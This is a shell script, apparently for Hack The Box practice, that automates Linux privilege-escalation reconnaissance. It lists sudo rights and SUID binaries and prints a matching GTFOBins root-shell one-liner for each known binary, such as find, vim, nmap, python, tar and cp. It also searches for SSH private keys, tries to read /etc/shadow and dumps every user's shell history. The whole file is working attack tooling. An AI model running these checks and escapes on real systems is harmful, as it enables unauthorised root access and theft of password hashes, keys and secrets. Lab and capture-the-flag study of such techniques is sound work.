#!/bin/sh
# HTB PrivEsc checks + GTFOBins hints - restricted shell friendly

echo "========== 1. sudo -l =========="
sudo -l 2>/dev/null || echo "[-] sudo not available or permission denied"
echo

echo "========== 2. SUID binaries =========="
SUIDS=$(find / -perm -u=s -type f 2>/dev/null)
echo "$SUIDS"
echo

echo "========== GTFOBins Hints (SUID) =========="
echo "$SUIDS" | while read -r bin; do
    case "$bin" in
        */find)
            echo "[+] $bin → GTFOBins: find -exec /bin/sh -p \\; -quit"
            ;;
        */vim|*/vi|*/nvim)
            echo "[+] $bin → GTFOBins: $bin -c ':!/bin/sh'"
            ;;
        */nmap)
            echo "[+] $bin → GTFOBins: echo 'os.execute(\"/bin/sh\")' > /tmp/shell.nse && $bin --script=/tmp/shell.nse"
            ;;
        */bash|*/sh)
            echo "[+] $bin → GTFOBins: $bin -p"
            ;;
        */python*|*/python3*)
            echo "[+] $bin → GTFOBins: $bin -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
            ;;
        */perl)
            echo "[+] $bin → GTFOBins: $bin -e 'exec \"/bin/sh\";'"
            ;;
        */ruby)
            echo "[+] $bin → GTFOBins: $bin -e 'exec \"/bin/sh\"'"
            ;;
        */less|*/more)
            echo "[+] $bin → GTFOBins: $bin /etc/passwd  then  !/bin/sh"
            ;;
        */awk|*/gawk|*/mawk)
            echo "[+] $bin → GTFOBins: $bin 'BEGIN {system(\"/bin/sh\")}'"
            ;;
        */nano)
            echo "[+] $bin → GTFOBins: $bin  then  ^R^X  and type  reset; sh 1>&0 2>&0"
            ;;
        */cp)
            echo "[+] $bin → GTFOBins: $bin /bin/sh /tmp/sh && chmod +s /tmp/sh"
            ;;
        */mv)
            echo "[+] $bin → GTFOBins: useful for overwriting files with elevated privileges"
            ;;
        */tar)
            echo "[+] $bin → GTFOBins: $bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
            ;;
        */zip)
            echo "[+] $bin → GTFOBins: TF=\$(mktemp -u); $bin \$TF /etc/hosts -T -TT 'sh #'"
            ;;
        */env)
            echo "[+] $bin → GTFOBins: $bin /bin/sh -p"
            ;;
        */busybox)
            echo "[+] $bin → GTFOBins: $bin sh"
            ;;
        */php*)
            echo "[+] $bin → GTFOBins: $bin -r \"pcntl_exec('/bin/sh', ['-p']);\""
            ;;
        */node)
            echo "[+] $bin → GTFOBins: $bin -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio:[0,1,2]})'"
            ;;
        */lua*)
            echo "[+] $bin → GTFOBins: $bin -e 'os.execute(\"/bin/sh\")'"
            ;;
        */strace)
            echo "[+] $bin → GTFOBins: $bin -o /dev/null /bin/sh -p"
            ;;
        */gdb)
            echo "[+] $bin → GTFOBins: $bin -nx -ex '!sh' -ex quit"
            ;;
        *)
            # silent for unknown binaries
            ;;
    esac
done
echo

echo "========== 3. /opt =========="
ls -la /opt 2>/dev/null || echo "[-] cannot list /opt"
echo

echo "========== 4. /tmp =========="
ls -la /tmp 2>/dev/null || echo "[-] cannot list /tmp"
echo

echo "========== 5. authorized_keys =========="
find / -name authorized_keys 2>/dev/null
echo

echo "========== 6. id_rsa (private keys) =========="
find / -name id_rsa 2>/dev/null
echo

echo "========== 7. /etc/shadow readability =========="
ls -la /etc/shadow 2>/dev/null
head -n 5 /etc/shadow 2>/dev/null || echo "[-] cannot read /etc/shadow"
echo

echo "========== 8. History =========="
echo "--- current shell history ---"
history 2>/dev/null || echo "[-] history command not available"
echo
echo "--- ~/.bash_history ---"
cat ~/.bash_history 2>/dev/null || echo "[-] no ~/.bash_history or cannot read"
echo
echo "--- other users' bash_history ---"
find /home -name .bash_history 2>/dev/null | while read -r f; do
    echo ">>> $f"
    cat "$f" 2>/dev/null
    echo
done
echo

echo "========== Done =========="
